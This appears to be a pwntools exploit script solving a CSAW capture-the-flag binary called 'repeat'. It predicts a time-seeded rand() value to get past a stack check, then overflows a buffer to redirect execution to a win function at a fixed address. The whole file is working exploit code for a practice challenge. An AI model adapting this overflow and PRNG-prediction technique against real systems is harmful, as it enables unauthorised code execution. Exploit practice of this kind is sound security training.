#!/usr/bin/env python3
from pwn import *
elf = context.binary = ELF('./repeat')
context.terminal = ['tmux', 'splitw', '-hb', '-F', '#\x7bpane_pid\x7d', '-P']

import ctypes

def conn():
    if args.REMOTE:
        # chals.ctf.csaw.io:30005
        io = remote('chals.ctf.csaw.io', 30005)
        # io = remote(args.HOST, args.PORT)
    elif args.GDB:
        gdbscript = """
            c
        """
        io = gdb.debug(None, gdbscript=gdbscript)
    else:
        io = process()
    return io

from random import randint

libc = ctypes.CDLL('libc.so.6')
libc.srand(libc.time(0) + randint(-5, 5))
r = conn()

# your solution here
n = (libc.rand() << 0x20) | libc.rand()
win = 0x004013fd

payload = b'A' * 0x48 + p64(n) + b'A' * 8 + p64(win)

r.sendlineafter('>', payload)

r.interactive()
